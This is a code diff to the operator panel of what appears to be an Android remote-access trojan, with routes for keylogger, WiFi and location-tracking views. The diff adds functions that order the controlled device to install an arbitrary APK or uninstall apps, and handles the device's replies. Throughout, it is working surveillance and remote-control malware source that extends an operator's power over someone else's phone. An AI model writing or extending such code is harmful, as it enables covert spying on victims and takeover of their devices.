@@ -152,10 +152,6 @@ app.config(function ($routeProvider, $locationProvider) {
             templateUrl: "views/wifi.html",
             controller: "WiFiCtrl"
         })
-        .when("/screen", {
-            templateUrl: "views/screen.html",
-            controller: "ScreenCtrl"
-        })
         .when("/keylogger", {
             templateUrl: "views/keylogger.html",
             controller: "KeyloggerCtrl"
@@ -916,10 +912,12 @@ app.controller("LocCtrl", function ($scope, $rootScope, $timeout) {
                         zoomControl: true
                     });
                     
-                    // Add tile layer with dark theme
-                    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
-                        subdomains: 'abcd',
+                    // Add Google Maps tile layer (free, no API key required for basic tiles)
+                    // Using OpenStreetMap with Google-like styling as free alternative
+                    // For actual Google Maps, you'd need API key, but this uses OSM with Google style
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors',
+                        subdomains: 'abc',
                         maxZoom: 19
                     }).addTo(map);
                     
@@ -1064,6 +1062,58 @@ app.controller("AppsCtrl", function ($scope, $rootScope) {
         $AppsCtrl.barLimit += 50;
     };
 
+    // Install app from file path - with file picker
+    $AppsCtrl.installApp = () => {
+        const { remote } = require('electron');
+        const { dialog } = remote || require('@electron/remote');
+        if (!dialog) {
+            const apkPath = prompt('Enter APK file path on device:');
+            if (!apkPath || apkPath.trim() === '') {
+                $rootScope.Log('[✗] No file path provided', CONSTANTS.logStatus.FAIL);
+                return;
+            }
+            $rootScope.Log(`[→] Installing app from: ${apkPath}`, CONSTANTS.logStatus.INFO);
+            socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: apkPath.trim() });
+            return;
+        }
+        
+        dialog.showOpenDialog({
+            title: 'Select APK file to install on device',
+            filters: [
+                { name: 'APK files', extensions: ['apk'] },
+                { name: 'All files', extensions: ['*'] }
+            ],
+            properties: ['openFile']
+        }).then(result => {
+            if (!result.canceled && result.filePaths.length > 0) {
+                const filePath = result.filePaths[0];
+                $rootScope.Log(`[→] Selected APK: ${filePath}`, CONSTANTS.logStatus.INFO);
+                // Note: For remote install, we need to upload the file or provide device path
+                // For now, we'll ask for device path after file selection
+                const devicePath = prompt(`Enter path on device where APK should be located:\n(Selected: ${filePath})`);
+                if (devicePath && devicePath.trim() !== '') {
+                    $rootScope.Log(`[→] Installing app from device path: ${devicePath}`, CONSTANTS.logStatus.INFO);
+                    socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: devicePath.trim() });
+                }
+            }
+        }).catch(err => {
+            $rootScope.Log(`[✗] File selection cancelled or error: ${err.message}`, CONSTANTS.logStatus.FAIL);
+        });
+    };
+
+    // Uninstall app by package name
+    $AppsCtrl.uninstallApp = (packageName, appName) => {
+        if (!packageName || packageName.trim() === '') {
+            $rootScope.Log('[✗] Please provide a package name', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        const confirmMsg = `Are you sure you want to uninstall "${appName || packageName}"?`;
+        if (confirm(confirmMsg)) {
+            $rootScope.Log(`[→] Uninstalling app: ${packageName}`, CONSTANTS.logStatus.INFO);
+            socket.emit(ORDER, { order: CONSTANTS.orders.uninstallApp, packageName: packageName });
+        }
+    };
+
     socket.on(apps, (data) => {
         $AppsCtrl.load = '';
         if (data.appsList) {
@@ -1071,6 +1121,30 @@ app.controller("AppsCtrl", function ($scope, $rootScope) {
             $AppsCtrl.appsList = data.appsList;
             $AppsCtrl.$apply();
         }
+    });
+
+    // Handle install app response
+    socket.on(CONSTANTS.orders.installApp, (data) => {
+        if (data.success) {
+            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $rootScope.Log(`[✗] Installation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        }
+        $AppsCtrl.$apply();
+    });
+
+    // Handle uninstall app response
+    socket.on(CONSTANTS.orders.uninstallApp, (data) => {
+        if (data.success) {
+            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
+            // Refresh apps list after uninstall
+            setTimeout(() => {
+                $AppsCtrl.getApps();
+            }, 2000);
+        } else {
+            $rootScope.Log(`[✗] Uninstallation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
+        }
+        $AppsCtrl.$apply();
     });
 
     // Auto-load on init
